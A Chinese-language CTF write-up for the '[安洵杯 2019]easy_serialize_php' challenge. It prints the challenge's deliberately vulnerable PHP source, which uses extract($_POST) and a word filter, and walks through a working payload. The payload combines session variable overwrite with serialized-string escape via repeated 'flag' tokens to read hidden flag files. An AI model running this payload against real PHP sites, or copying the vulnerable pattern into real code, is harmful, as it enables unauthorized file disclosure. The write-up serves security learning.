# [安洵杯 2019]easy_serialize_php

## 知识点

`php反序列化字符串逃逸(变短)`

`SESSION变量覆盖`

## 解题

在首页点击`show_source`即可获得`php`源码

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

在`phpinfo`中找到了，`auto_append_file`说明自动在文件中执行该文件代码，说明要读取这个文件

![image-20231113180630471](G:/CTFWriteUp/buuctf/Web/img/13-3.png)

 `extract($_POST)`就是将`post`的内容作为这个函数的参数。

然后就是变量覆盖。**如果`post`传参为`_SESSION[flag]=123`，那么`$_SESSION["user"]`和`$_SESSION["function"]`的值都会被覆盖**。

至于为什么`post`要传`_SESSION[flag]=123`而不是`$_SESSION[flag]=123`，是因为`_SESSION`是变量名，如果传`$_SESSION`，那么就会失效。

然后就是`反序列化字符串逃逸`，因为这里的`filter`函数是将匹配到的字符串清空，所以是反`序列化字符串逃逸(变短)`

首先按照`phpinfo.php`给的信息读取文件

```php
<?php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';      // d0g3_f1ag.php的base64编码

echo(serialize($_SESSION));
```

生成序列化后的字符串，取需要逃逸的部分，这里取的部分为红框里的部分

![](G:/CTFWriteUp/buuctf/Web/img/[安洵杯 2019]easy_serialize_php-1.png)

在红框部分前面`随意加一个字符`，我这里加了`C`

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'C";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';      // d0g3_f1ag.php的base64编码

echo(serialize($_SESSION));
```

然后看之前红框部分前面这里到添加的`C`字符这部分的长度来决定填充字符

![](G:/CTFWriteUp/buuctf/Web/img/[安洵杯 2019]easy_serialize_php-2.png)

这里需要逃逸`24`个字符，一个`flag`能逃逸`4`个，所以需要`6`个`flag`

```json
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=C";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

![](G:/CTFWriteUp/buuctf/Web/img/[安洵杯 2019]easy_serialize_php-3.png)

因为`/d0g3_fllllllag`转为`base64`之后长度也是`20`，和`d0g3_f1ag.php`长度相同

所以直接改`img`部分反序列化的值即可，`L2QwZzNfZmxsbGxsbGFn`

![](G:/CTFWriteUp/buuctf/Web/img/[安洵杯 2019]easy_serialize_php-4.png)

[本人博客](https://cmacckk.github.io/2021/06/05/phpUnserialize/#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%8F%98%E7%9F%AD)

[参考文章](